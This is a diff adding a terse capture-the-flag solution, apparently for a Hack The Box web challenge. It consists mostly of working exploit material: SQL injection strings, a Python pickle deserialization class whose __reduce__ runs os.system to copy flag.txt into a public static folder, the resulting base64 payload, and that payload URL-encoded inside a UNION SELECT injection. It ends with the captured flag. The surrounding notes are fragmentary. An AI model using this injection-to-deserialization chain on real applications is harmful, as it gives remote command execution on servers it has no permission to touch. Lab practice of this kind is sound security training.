@@ -1,0 +1,30 @@
+' or+id%3d'1 encodered: %27OR%2Bid%253d%271
+
+import pickle
+import base64
+import os
+
+payload = 'cp flag.txt application/static/.'
+
+class Exploit:
+	def __reduce__(self):
+		return os.system, (payload,)
+
+if __name__== '__main__':
+	print(base64.urlsafe_b64encode(pickle.dumps(Exploit())).decode('ascii'))
+
+python3 exploit.py
+ 
+gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==
+
+Encodea++
+
+'UNION SELECT 'gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg==
+
+Encoded""
+
+%27UNION%20SELECT%20%27gASVOwAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjCBjcCBmbGFnLnR4dCBhcHBsaWNhdGlvbi9zdGF0aWMvLpSFlFKULg%3D%3D
+
+/static/flag.txt
+
+HTB{n0_m0re_p1ckl3++++++++++++}
